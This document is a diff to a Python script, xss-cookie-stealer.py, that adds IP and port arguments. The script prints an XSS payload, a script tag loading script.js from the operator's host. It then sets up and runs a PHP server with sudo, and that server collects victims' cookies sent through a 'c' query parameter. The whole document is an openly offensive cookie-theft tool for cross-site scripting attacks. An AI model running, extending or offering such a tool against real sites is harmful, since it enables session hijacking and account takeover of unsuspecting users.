@@ -2,17 +2,27 @@
 import os
 import sys
 import subprocess
+import argparse
+#MuteAvery was here ~:>
+
+#Arguments for script   
+parser = argparse.ArgumentParser()
+parser.add_argument("-i", "--ip", required=False, help="Your IP ")
+parser.add_argument("-p", "--port",required=False, help="The port for your php server")
+parser.add_argument("-ch", "--custom_help", required=False, action="store_true", help="Description, documentation")
+args = parser.parse_args()
+
 
 def show_help():
     print("""
-Usage: python3 xss-cookie-stealer.py <IP>
+Usage: python3 xss-cookie-stealer.py -i <IP-ADDRESS> -p <port> 
 
 Options:
   -h, --help    Show this help message and exit
 
 Description:
   This script creates a web-server directory containing an 'index.php' and a 'script.js' for capturing cookies. 
-  It then starts a PHP server on port 80 to serve these files.
+  It then starts a PHP server on a port of your choice to serve these files.
 
 Steps:
   1. Provide the IP address as a parameter, and the script will echo the payload.
@@ -21,9 +31,10 @@ Steps:
   3. The script will create a directory named 'web-server' and set up the PHP server.
     """)
 
-def create_web_server(ip):
+
+def create_web_server(ip,port):
     # Echo the payload instead of saving it to a file
-    payload = f'<script src="http://{ip}/script.js"></script>'
+    payload = f'<script src="http://{ip}:{port}/script.js"></script>'
     print(f"Payload: {payload}")
 
     # Create the 'web-server' directory
@@ -54,20 +65,24 @@ if (isset($_GET['c'])) {
 
     # Start the PHP web server with sudo privileges
     try:
-        subprocess.run(["sudo", "php", "-S", "0.0.0.0:80", "-t", "web-server"], check=True)
+        subprocess.run(["sudo", "php", "-S", f"0.0.0.0:{port}", "-t", "web-server"], check=True)
     except subprocess.CalledProcessError as e:
         print(f"Error starting PHP server: {e}")
         sys.exit(1)
 
-if __name__ == "__main__":
-    if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
-        show_help()
-        sys.exit(0)
-    
-    if len(sys.argv) != 2:
-        print("Error: Missing IP address.")
-        show_help()
-        sys.exit(1)
 
-    ip = sys.argv[1]
-    create_web_server(ip)
+def main():
+    ip = args.ip
+    port = args.port
+    if args.custom_help:
+        show_help()
+        exit(1)
+    elif len(sys.argv) == 1:
+        show_help()
+        sys.exit(0) 
+    else:
+        create_web_server(ip,port)
+
+
+if __name__ == "__main__":
+    main()
